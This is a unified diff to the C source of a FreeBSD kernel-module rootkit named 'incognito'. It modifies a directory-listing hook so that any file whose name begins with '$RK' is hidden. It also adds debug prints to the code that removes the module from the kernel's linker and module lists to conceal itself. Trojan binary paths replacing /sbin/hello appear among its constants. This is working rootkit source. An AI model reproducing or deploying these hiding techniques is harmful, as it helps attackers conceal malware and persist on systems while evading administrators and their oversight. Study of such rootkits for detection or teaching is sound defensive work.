@@ -18,7 +18,7 @@
 
 #define ORIGINAL "/sbin/hello"
 #define TROJAN "/sbin/trojan_hello"
-#define T_NAME "trojan_hello"
+#define T_NAME "$RK"
 #define VERSION "incognito-0.3.ko"
 /*
 * The following is the list of variables you need to reference in order
@@ -139,7 +139,7 @@ count = size;
 while ((current->d_reclen != 0) && (count > 0)) {
 count -= current->d_reclen;
 /* Do we want to hide this file? */
-if(strcmp((char *)&(current->d_name), T_NAME) == 0)
+if(strncmp((char *)&(current->d_name), T_NAME, 3) == 0)
 {
 /*
 * Copy every directory entry found after
@@ -189,6 +189,7 @@ load(struct module *module, int cmd, void *arg)
 	* If found, decrement next_file_id and remove from list.
 	*/
 	TAILQ_FOREACH(lf, &linker_files, link) {
+		uprintf( "Checking: %s\n", lf->filename );
 		if (strcmp(lf->filename, VERSION) == 0) {
 			next_file_id--;
 			TAILQ_REMOVE(&linker_files, lf, link);
@@ -203,6 +204,7 @@ load(struct module *module, int cmd, void *arg)
 	* If found, decrement nextid and remove from list.
 	*/
 	TAILQ_FOREACH(mod, &modules, link) {
+		uprintf( "Checking: %s\n", mod->name );
 		if (strcmp(mod->name, "incognito") == 0) {
 			nextid--;
 			TAILQ_REMOVE(&modules, mod, link);
